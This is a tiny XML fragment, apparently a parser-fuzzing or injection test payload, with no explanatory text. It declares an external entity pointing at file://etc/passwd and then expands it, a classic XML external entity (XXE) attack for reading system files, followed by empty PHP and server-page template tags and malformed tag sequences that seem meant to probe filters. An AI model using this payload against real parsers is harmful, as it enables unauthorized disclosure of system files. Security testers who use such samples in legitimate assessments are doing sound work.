<?xml version="1.0" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://etc/passwd" >]>
<?php ?>
<% %>
 <%= =%>
   <?=
&xxe;
<<!>?<!>php
